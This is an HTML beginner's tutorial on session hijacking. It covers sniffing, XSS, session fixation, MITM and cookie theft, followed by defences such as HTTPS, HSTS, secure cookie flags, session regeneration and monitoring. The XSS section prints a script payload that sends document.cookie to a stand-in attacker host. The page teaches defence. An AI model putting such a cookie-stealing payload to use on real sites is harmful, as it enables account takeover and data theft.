<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <h1>🕵️‍♂️ Session Hijacking – Stealing Sessions, Not Passwords</h1>

  <h2>👶 For Beginners: What is Session Hijacking?</h2>
  <p>
    Session Hijacking is a type of attack where a hacker steals a user's active session ID and uses it to impersonate them on a web application — without needing their password.
  </p>
  <p>
    💡 Imagine you’ve logged in to your email on a public Wi-Fi. Someone nearby grabs your session key and gains full access to your inbox. You’re still logged in, but so are they — pretending to be you!
  </p>

  <h2>🔐 What is a Session?</h2>
  <p>
    A session is a temporary interaction between a user and a web app — typically after logging in. It's how the server remembers who you are while you browse.
  </p>
  <p>
    The server gives your browser a unique session ID (usually stored in a cookie), which is sent with each request:
  </p>
  <pre><code>Cookie: sessionid=abc123xyz</code></pre>
  <p>
    If someone steals this session ID, they can send it in their own requests and hijack your session.
  </p>

  <h2>⚠️ Why is Session Hijacking Dangerous?</h2>
  <ul>
    <li>🔓 Account Takeover – Full access to personal accounts (email, banking, admin panels)</li>
    <li>📤 Data Theft – Read or export sensitive data</li>
    <li>🎭 Impersonation – Send messages, perform transactions, or change settings as the user</li>
    <li>👣 Silent Attacks – Often goes undetected since no password is required</li>
  </ul>

  <h2>🔍 Common Methods of Session Hijacking</h2>

  <h3>🕸️ 1. Sniffing (Network-based Hijacking)</h3>
  <p>On unencrypted connections (like HTTP), session IDs can be sniffed using tools like Wireshark.</p>
  <p>Common on public Wi-Fi networks.</p>

  <h3>📦 2. Cross-Site Scripting (XSS)</h3>
  <p>Malicious JavaScript can read session cookies and send them to the attacker.</p>
  <pre><code>&lt;script&gt;
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
&lt;/script&gt;</code></pre>

  <h3>🔁 3. Session Fixation</h3>
  <p>Attacker sets a known session ID for the victim, then hijacks it once they log in.</p>

  <h3>🧩 4. Man-in-the-Middle (MITM)</h3>
  <p>Intercepting requests between the user and the server to grab session tokens.</p>

  <h3>🔓 5. Local Access / Cookie Theft</h3>
  <p>Malware, browser extensions, or physical access can reveal session data stored in the browser.</p>

  <h2>🔐 What Does a Hijacked Session Look Like?</h2>
  <pre><code>GET /dashboard HTTP/1.1  
Host: example.com  
Cookie: sessionid=abc123xyz</code></pre>
  <p>If the attacker uses this stolen sessionid, the server will believe it’s the original user — unless protection is in place.</p>

  <h2>🛡️ How to Prevent Session Hijacking</h2>

  <h3>✔️ 1. Use HTTPS Everywhere</h3>
  <p>Encrypts traffic, preventing sniffing and MITM attacks.</p>
  <p>Apply HSTS headers to force HTTPS:</p>
  <pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>

  <h3>✔️ 2. Secure Cookies</h3>
  <p>Mark session cookies as:</p>
  <ul>
    <li>Secure → only sent over HTTPS</li>
    <li>HttpOnly → inaccessible via JavaScript</li>
    <li>SameSite=Strict → prevents cross-origin leaks</li>
  </ul>
  <pre><code>Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict</code></pre>

  <h3>✔️ 3. Regenerate Session IDs</h3>
  <p>Always generate a new session ID after login to prevent fixation attacks.</p>
  <pre><code>req.session.regenerate(callback);</code></pre>

  <h3>✔️ 4. Enable Session Timeout & Inactivity Expiry</h3>
  <p>Auto-expire idle sessions (e.g., after 15 minutes of inactivity)</p>
  <p>Enforce hard timeouts (e.g., 1-hour session max)</p>

  <h3>✔️ 5. Bind Sessions to User Context</h3>
  <p>Tie session to:</p>
  <ul>
    <li>IP address</li>
    <li>User-Agent string</li>
    <li>Device fingerprint</li>
  </ul>
  <p>If these change drastically, invalidate the session.</p>

  <h3>✔️ 6. Detect Suspicious Session Activity</h3>
  <p>Monitor for:</p>
  <ul>
    <li>Multiple IPs using same session</li>
    <li>Unusual geolocation</li>
    <li>Concurrent logins</li>
  </ul>

  <h2>🚀 Final Thoughts</h2>
  <p>Session Hijacking is dangerous because it lets attackers skip the login screen entirely and jump straight into your account. The weakest link is often session handling, not passwords.</p>
  <p>💡 Protecting your session is just as important as protecting your password.</p>
  <h3>🔐 Always use HTTPS, secure cookies, and smart session management — or risk someone else "logging in" as you.</h3>

</body>
</html>
